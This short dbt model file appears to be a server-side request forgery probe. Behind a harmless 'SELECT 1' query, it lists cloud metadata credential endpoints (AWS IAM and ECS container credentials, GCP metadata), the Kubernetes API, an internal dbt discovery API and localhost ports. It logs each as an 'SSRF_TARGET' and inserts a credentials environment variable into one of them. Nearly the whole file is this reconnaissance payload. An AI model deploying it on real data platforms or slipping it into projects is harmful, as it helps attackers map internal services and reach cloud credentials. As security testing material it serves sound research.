{% set targets = [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/meta-data/instance-id',
    'http://169.254.169.254/latest/meta-data/placement/region',
    'http://metadata.google.internal/computeMetadata/v1/project/project-id',
    'http://169.254.170.2' ~ env_var('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '/v2/credentials'),
    'http://kubernetes.default.svc:443/api/v1/namespaces',
    'http://account-discovery-api.global.prod.dbt.com/',
    'http://localhost:8080/',
    'http://localhost:9090/',
    'http://localhost:3000/'
] %}

{% for target in targets %}
{% set encoded = target | replace('/', '%2F') | replace(':', '%3A') %}
{{ log("SSRF_TARGET_" ~ loop.index ~ "=" ~ target, info=True) }}
{% endfor %}

SELECT 1 as id
